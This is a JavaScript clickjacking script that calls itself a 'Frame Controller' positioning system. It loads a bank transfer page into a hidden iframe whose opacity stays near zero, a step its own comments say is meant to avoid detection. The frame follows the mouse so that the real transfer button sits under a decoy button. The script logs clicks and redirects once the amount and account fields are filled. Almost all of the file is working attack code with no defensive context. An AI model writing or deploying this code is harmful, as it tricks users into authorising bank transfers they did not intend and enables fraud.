// Frame Controller - Advanced positioning system
// Version 2.3.1

(function() {
    'use strict';
    
    // Configuration variables
    const TARGET_SITE = 'https://secure-banking.example.com/transfer';
    const REDIRECT_URL = '/success.html';
    const OPACITY_INCREMENT = 0.0001;
    const POSITION_OFFSET_X = 0;
    const POSITION_OFFSET_Y = 0;
    const CLICK_DELAY = 1500;
    
    // State tracking
    let mouseX = 0;
    let mouseY = 0;
    let clickCount = 0;
    let isFrameReady = false;
    let opacityLevel = 0;
    let positionTimer = null;
    
    // Initialize attack frame
    const attackFrame = document.getElementById('overlay-frame');
    
    if (!attackFrame) {
        console.error('Attack frame not found');
        return;
    }
    
    // Set target URL
    attackFrame.src = TARGET_SITE;
    
    // Initial frame styling
    attackFrame.style.opacity = '0';
    attackFrame.style.pointerEvents = 'auto';
    
    // Frame load handler
    attackFrame.addEventListener('load', function() {
        isFrameReady = true;
        console.log('Frame positioned');
        graduallyIncreaseOpacity();
    });
    
    // Gradually increase opacity to avoid detection
    function graduallyIncreaseOpacity() {
        const opacityTimer = setInterval(function() {
            if (opacityLevel >= 0.01) {
                clearInterval(opacityTimer);
                return;
            }
            opacityLevel += OPACITY_INCREMENT;
            attackFrame.style.opacity = opacityLevel.toString();
        }, 100);
    }
    
    // Track mouse movements
    document.addEventListener('mousemove', function(event) {
        mouseX = event.clientX;
        mouseY = event.clientY;
        
        if (isFrameReady) {
            adjustFramePosition(mouseX, mouseY);
        }
    });
    
    // Dynamic frame positioning based on mouse location
    function adjustFramePosition(x, y) {
        if (positionTimer) {
            clearTimeout(positionTimer);
        }
        
        positionTimer = setTimeout(function() {
            const fakeButton = document.getElementById('fake-button');
            if (!fakeButton) return;
            
            const buttonRect = fakeButton.getBoundingClientRect();
            const buttonCenterX = buttonRect.left + (buttonRect.width / 2);
            const buttonCenterY = buttonRect.top + (buttonRect.height / 2);
            
            // Calculate offset to align hidden button with fake button
            const offsetX = buttonCenterX - x + POSITION_OFFSET_X;
            const offsetY = buttonCenterY - y + POSITION_OFFSET_Y;
            
            // Apply positioning
            attackFrame.style.transform = `translate(${offsetX}px, ${offsetY}px)`;
            
            console.log('Frame positioned', {x: offsetX, y: offsetY, timestamp: Date.now()});
        }, 50);
    }
    
    // Capture click events
    document.addEventListener('click', function(event) {
        clickCount++;
        
        console.log('Click captured', {
            x: event.clientX,
            y: event.clientY,
            count: clickCount,
            timestamp: Date.now(),
            target: event.target.id || event.target.className
        });
        
        // Check if form fields are filled
        if (checkFormFields()) {
            triggerRedirect();
        }
    });
    
    // Check if required form fields are filled
    function checkFormFields() {
        const amountField = document.getElementById('amount');
        const accountField = document.getElementById('account');
        
        if (!amountField || !accountField) {
            return false;
        }
        
        const amountFilled = amountField.value && amountField.value.trim() !== '';
        const accountFilled = accountField.value && accountField.value.trim() !== '';
        
        return amountFilled && accountFilled;
    }
    
    // Trigger redirect after successful click capture
    function triggerRedirect() {
        setTimeout(function() {
            console.log('Redirecting to success page', {
                delay: CLICK_DELAY,
                url: REDIRECT_URL,
                timestamp: Date.now()
            });
            window.location.href = REDIRECT_URL;
        }, CLICK_DELAY);
    }
    
    // Store timing information for analysis
    const timingData = {
        pageLoadTime: performance.now(),
        firstMouseMove: null,
        firstClick: null,
        redirectTriggered: null
    };
    
    // Update timing on first mouse move
    document.addEventListener('mousemove', function() {
        if (timingData.firstMouseMove === null) {
            timingData.firstMouseMove = performance.now();
        }
    }, {once: true});
    
    // Update timing on first click
    document.addEventListener('click', function() {
        if (timingData.firstClick === null) {
            timingData.firstClick = performance.now();
        }
    }, {once: true});
    
})();